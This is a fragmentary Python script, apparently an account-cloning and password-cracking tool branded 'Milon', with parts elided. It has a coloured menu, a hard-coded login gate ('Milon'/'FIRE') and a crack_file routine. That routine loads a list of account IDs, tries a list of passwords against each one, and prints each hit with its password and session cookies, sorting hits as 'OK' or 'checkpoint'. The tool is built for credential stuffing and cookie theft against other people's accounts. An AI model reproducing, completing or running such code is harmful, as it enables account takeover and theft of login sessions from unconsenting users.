...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mMilon')
...
while attemps < 12345677901:
    ...
    if username == 'Milon' and password == 'FIRE':
...
def login():
	banner()
	Milonj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	Milonj('\033[0;97m===============================================')
	Milon= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if Milon in ['m']:
		public()
	elif Milon in ['1']:
		crack_file()
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/kazim.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Milon-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Milon-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#Milon-King
				print(f'\r\033[0;92m[Milon-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " Milon,  Ok,  id"')
